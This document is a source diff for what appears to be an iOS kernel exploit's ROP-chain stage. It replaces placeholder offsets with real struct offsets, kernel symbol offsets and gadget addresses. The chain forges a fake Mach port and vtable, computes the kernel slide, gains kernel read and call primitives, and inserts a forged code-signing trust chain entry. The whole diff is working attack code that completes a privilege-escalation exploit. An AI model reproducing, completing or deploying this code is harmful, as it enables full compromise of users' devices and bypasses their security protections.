@@ -555,8 +555,8 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 				break;
 		}
 		if (next->comment != NULL) {
-			printf("COMMENT: ");
-			puts(next->comment);
+			printf("COMMENT(line: %llu): ",next->comment->line);
+			puts(next->comment->comment);
 		}
 		next = next->next;
 	}
@@ -627,7 +627,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	DEFINE_ROP_VAR("ool_msg",sizeof(ool_message_struct),ool_message); // the message we will send to the kernel
 	DEFINE_ROP_VAR("ool_msg_recv",sizeof(ool_message_struct),tmp); // the message we will recieve from the kernel
 
-	ROP_VAR_CPY_W_OFFSET("ool_msg",0 /*FIXME: offset should be desc[0].address*/,"tmp_port",0,sizeof(ool_message->desc[0].address));
+	ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,desc) + offsetof(mach_msg_ool_ports_descriptor_t, address) /*offset of desc[0].address*/,"tmp_port",0,sizeof(ool_message->desc[0].address));
 
 
 	kport_t * fakeport = malloc(sizeof(kport_t));
@@ -687,6 +687,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	ADD_COMMENT(name); \
 	CALL_FUNC(get_addr_from_name(name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
 
+	ADD_COMMENT("mach_task_self");
 	CALL_FUNC_RET_SAVE_VAR("self",get_addr_from_name("mach_task_self"),0,0,0,0,0,0,0,0);
 
 	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
@@ -705,10 +706,10 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 		ROP_VAR_ARG64("msg_port",3);
 		CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);
 
-		ROP_VAR_CPY_W_OFFSET("ool_msg",0 /*FIXME: this must be head.msgh_remote_port */,"msg_port",0,sizeof(mach_port_t));
+		ROP_VAR_CPY_W_OFFSET("ool_msg",offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_remote_port) /*offset of head.msgh_remote_port */,"msg_port",0,sizeof(mach_port_t));
 
 		ROP_VAR_ARG("ool_msg",1);
-		ROP_VAR_ARG_W_OFFSET("ool_msg",3, 0 /*FIXME: offset to head.msgh_size */);
+		ROP_VAR_ARG_W_OFFSET("ool_msg",3, offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_size) /*offset of head.msgh_size */);
 		CALL("mach_msg",0,MACH_SEND_MSG,0,0,0,0,0,0);
 
 		// no need for another loop in rop... we can just unroll this one here
@@ -718,7 +719,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 			CALL("IOConnectCallStructMethod",0,7,0,sizeof(raw_dict),0,0,0,0);
 		}
 
-		ROP_VAR_CPY_W_OFFSET("ool_msg_recv",0 /*FIXME: this must be head.msgh_local_port */,"msg_port",0,sizeof(mach_port_t));
+		ROP_VAR_CPY_W_OFFSET("ool_msg_recv", offsetof(ool_message_struct,head) + offsetof(mach_msg_header_t,msgh_local_port) /*offset of head.msgh_local_port */,"msg_port",0,sizeof(mach_port_t));
 
 		ROP_VAR_ARG("ool_msg_recv",1);
 		ROP_VAR_ARG64("msg_port",5);
@@ -728,7 +729,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 		// check if we found a port:
 
 		// copy the descriptor address into it's own var
-		ROP_VAR_ARG_W_OFFSET("ool_msg_recv",2,0 /*FIXME: this has to be .desc[0].address*/);
+		ROP_VAR_ARG_W_OFFSET("ool_msg_recv",2, offsetof(ool_message_struct,desc) + offsetof(mach_msg_ool_ports_descriptor_t, address) /*offset of .desc[0].address*/);
 		ROP_VAR_ARG("desc_addr",1);
 		CALL("memcpy",0,0,8,0,0,0,0,0);
 
@@ -765,16 +766,16 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 
 	// get the heap addr
 	DEFINE_ROP_VAR("heap_addr",sizeof(uint64_t),tmp);
-	ROP_VAR_CPY_W_OFFSET("fakeport",0 /*FIXME: this must be fakeport.ip_pdrequest*/,"heap_addr",0,sizeof(uint64_t));
+	ROP_VAR_CPY_W_OFFSET("fakeport",offsetof(kport_t,ip_pdrequest) /*offset of fakeport.ip_pdrequest*/,"heap_addr",0,sizeof(uint64_t));
 	
 	// setup kr32
 	DEFINE_ROP_VAR("ip_requests_buf",0x20,tmp);
-	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport", 0 /*FIXME: this must be fakeport.ip_requests*/,"ip_requests_buf",0);
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport", offsetof(kport_t,ip_requests) /*offset of fakeport.ip_requests*/,"ip_requests_buf",0);
 
 	DEFINE_ROP_VAR("out_sz",8,tmp);
 	SET_ROP_VAR64("out_sz",1);
 #define kr32_raw(addr_var,valuename,offset) \
-	SET_ROP_VAR64_TO_VAR_W_OFFSET("ip_requests_buf",0 /*FIXME: ipr_size offset*/,addr_var,offset); \
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("ip_requests_buf",offsets->ipr_size,addr_var,offset); \
 	ROP_VAR_ARG64("self",1); \
 	ROP_VAR_ARG64("the_one",2); \
 	ROP_VAR_ARG(valuename,4); \
@@ -802,7 +803,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	// get the task pointer from our recv addr
 	DEFINE_ROP_VAR("task_pointer",8,tmp);
 	DEFINE_ROP_VAR("heap_addr_task_ptr",8,tmp);
-	SET_ROP_VAR64("heap_addr_task_ptr",0 /*FIXME: is_task_offset*/);
+	SET_ROP_VAR64("heap_addr_task_ptr",offsets->is_task);
 	ROP_VAR_ADD("heap_addr_task_ptr","heap_addr_task_ptr","recv_heap_addr");
 	kr64("heap_addr_task_ptr","task_pointer");
 
@@ -815,7 +816,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	// get the address of the client port
 	DEFINE_ROP_VAR("ip_kobject_client_port",8,tmp);
 	DEFINE_ROP_VAR("ip_kobject_ptr",8,tmp);
-	SET_ROP_VAR64("ip_kobject_ptr",0 /* FIXME: itk_registered offset*/);
+	SET_ROP_VAR64("ip_kobject_ptr",offsets->itk_registered);
 	ROP_VAR_ADD("ip_kobject_ptr","ip_kobject_ptr","task_pointer");
 	kr64("ip_kobject_ptr","ip_kobject_client_port");
 
@@ -832,18 +833,18 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 
 	// get the slide
 	DEFINE_ROP_VAR("kslide",8,tmp);
-	SET_ROP_VAR64("kslide",(UINT64_MAX - 0 /*FIXME: unslid rootdomainUC vtab*/ + 1));
+	SET_ROP_VAR64("kslide",(UINT64_MAX - offsets->rootdomainUC_vtab + 1));
 	ROP_VAR_ADD("kslide","kslide","RootDomainUC_VTAB");
 
 	// fully setup trust chain entry now
 	DEFINE_ROP_VAR("bss_trust_chain_head",8,tmp);
 	DEFINE_ROP_VAR("bss_trust_chain_head_ptr",8,tmp);
-	SET_ROP_VAR64("bss_trust_chain_head_ptr",0 /*FIXME: trust chain head ptr*/);
+	SET_ROP_VAR64("bss_trust_chain_head_ptr",offsets->trust_chain_head_ptr);
 	ROP_VAR_ADD("bss_trust_chain_head_ptr","bss_trust_chain_head_ptr","kslide");
 	kr64("bss_trust_chain_head_ptr","bss_trust_chain_head");
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("new_trust_chain_entry",offsetof(struct trust_chain,next),"bss_trust_chain_head",0);
 
-#define VTAB_SIZE 20
+#define VTAB_SIZE 0x100
 	// setup fake vtab in userland
 	DEFINE_ROP_VAR("UC_VTAB",VTAB_SIZE*8,tmp);
 	DEFINE_ROP_VAR("tmp_uint64",8,tmp);
@@ -873,7 +874,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	SET_ROP_VAR64_TO_VAR_W_OFFSET("fakeport",offsetof(kport_t,ip_kobject),"fake_client",0);
 	
 	// patch getExternalTrapForIndex
-	SET_ROP_VAR64("tmp_uint64",0 /*FIXME: gadget_add_x0_x0_ret*/);
+	SET_ROP_VAR64("tmp_uint64",offsets->gadget_add_x0_x0_ret);
 	ROP_VAR_ADD("tmp_uint64","tmp_uint64","kslide");
 	ROP_VAR_CPY_W_OFFSET("UC_VTAB",(0xb7*8),"tmp_uint64",0,8);
 
@@ -881,7 +882,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	
 	// setup call primitive
 	DEFINE_ROP_VAR("copyin_func_ptr",8,tmp);
-	SET_ROP_VAR64("copyin_func_ptr",0 /*FIXME: copyin */);
+	SET_ROP_VAR64("copyin_func_ptr",offsets->copyin);
 	ROP_VAR_ADD("copyin_func_ptr","copyin_func_ptr","kslide");
 	ROP_VAR_CPY_W_OFFSET("fake_client",0x48,"copyin_func_ptr",0,8);
 	// setup x0
@@ -900,5 +901,4 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 		build_databuffer(offsets,rop_var_top);
 	}
 	build_chain_DBG(offsets,rop_var_top);
-		
 }
